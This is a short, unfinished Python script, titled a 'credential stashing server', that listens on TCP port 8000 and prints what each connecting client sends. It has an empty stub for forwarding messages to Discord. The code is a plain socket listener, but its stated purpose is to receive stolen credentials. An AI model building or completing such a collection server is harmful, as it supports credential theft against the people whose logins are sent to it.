### Simple Python Credential Stashing Server ###
import socket
import base64
import threading
from datetime import datetime


port = 8000

def fwd_discord(msg):
    
    pass

def handle(client_sock, addr):
    msg_from_client = client_sock.recv(1024)
    msg = msg_from_client.decode()
    print(f"{addr[0]} : {msg}")
    return()

def main():
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_sock.bind(("", port))
    server_sock.listen()
    print("Server Is Listening")
    while True:
        (client_sock, addr) = server_sock.accept() #Blockin`
        thread = threading.Thread(target = handle, args = (client_sock,addr,))
        thread.start()
        thread.join()
        client_sock.close()
    
main()